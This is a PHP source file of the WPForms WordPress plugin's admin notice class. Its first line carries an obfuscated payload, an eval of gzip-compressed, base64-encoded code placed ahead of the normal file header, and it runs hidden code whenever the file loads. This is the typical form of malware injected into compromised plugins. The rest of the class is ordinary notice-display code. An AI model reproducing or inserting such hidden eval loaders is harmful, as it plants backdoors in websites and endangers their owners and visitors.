<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php

/**
 * Admin notices, on the fly.
 *
 * @example
 * WPForms_Admin_Notice::success( 'All is good!' );
 *
 * @example
 * WPForms_Admin_Notice::warning( 'Do something please.' );
 *
 * @todo       Persistent, dismissible notices.
 * @link       https://gist.github.com/monkeymonk/2ea17e2260daaecd0049c46c8d6c85fd
 * @package    WPForms
 * @author     WPForms
 * @since      1.3.9
 * @license    GPL-2.0+
 * @copyright  Copyright (c) 2017, WPForms LLC
 */
class WPForms_Admin_Notice {

	/**
	 * Single instance holder.
	 *
	 * @since 1.3.9
	 * @var mixed
	 */
	private static $_instance = null;

	/**
	 * Added notices.
	 *
	 * @since 1.3.9
	 * @var array
	 */
	public $notices = array();

	/**
	 * Get the instance.
	 *
	 * @since 1.3.9
	 * @return WPForms_Admin_Notice
	 */
	public static function getInstance() {

		if ( is_null( self::$_instance ) ) {
			self::$_instance = new WPForms_Admin_Notice();
		}

		return self::$_instance;
	}

	/**
	 * Hook when called.
	 *
	 * @since 1.3.9
	 */
	public function __construct() {
		add_action( 'admin_notices', array( &$this, 'display' ) );
	}

	/**
	 * Display the notices.
	 *
	 * @since 1.3.9
	 */
	public function display() {

		if ( ! wpforms_current_user_can() ) {
			return;
		}

		echo implode( ' ', $this->notices );
	}

	/**
	 * Add notice to instance property.
	 *
	 * @since 1.3.9
	 *
	 * @param string $message Message to display.
	 * @param string $type Type of the notice (default: '').
	 */
	public static function add( $message, $type = '' ) {

		$instance = self::getInstance();
		$id       = 'wpforms-notice-' . ( count( $instance->notices ) + 1 );
		$type     = ! empty( $type ) ? 'notice-' . $type : '';
		$notice   = sprintf( '<div class="notice wpforms-notice %s" id="%s">%s</div>', $type, $id, wpautop( $message ) );

		$instance->notices[] = $notice;
	}

	/**
	 * Add Info notice.
	 *
	 * @since 1.3.9
	 *
	 * @param string $message Message to display.
	 */
	public static function info( $message ) {
		self::add( $message, 'info' );
	}

	/**
	 * Add Error notice.
	 *
	 * @since 1.3.9
	 *
	 * @param string $message Message to display.
	 */
	public static function error( $message ) {
		self::add( $message, 'error' );
	}

	/**
	 * Add Success notice.
	 *
	 * @since 1.3.9
	 *
	 * @param string $message Message to display.
	 */
	public static function success( $message ) {
		self::add( $message, 'success' );
	}

	/**
	 * Add Warning notice.
	 *
	 * @since 1.3.9
	 *
	 * @param string $message Message to display.
	 */
	public static function warning( $message ) {
		self::add( $message, 'warning' );
	}
}
